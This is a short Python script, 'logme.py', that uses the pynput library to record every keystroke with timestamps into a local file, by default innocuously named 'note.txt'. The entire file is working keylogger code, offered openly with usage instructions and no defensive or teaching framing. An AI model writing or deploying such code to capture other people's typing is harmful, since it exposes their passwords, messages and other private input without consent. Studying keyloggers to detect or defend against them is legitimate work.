'''
make sure you have pynput installed : pip install pynput

Usage:
python3 logme.py 
python3 logme.py -f mysecretfile.txt
'''

from pynput.keyboard import Key, Listener
import logging
import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-f', '--file', type=str, help='Output file name (Default: note.txt)')
args = parser.parse_args()

filename = args.file or 'note.txt'

logging.basicConfig(filename=filename, \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
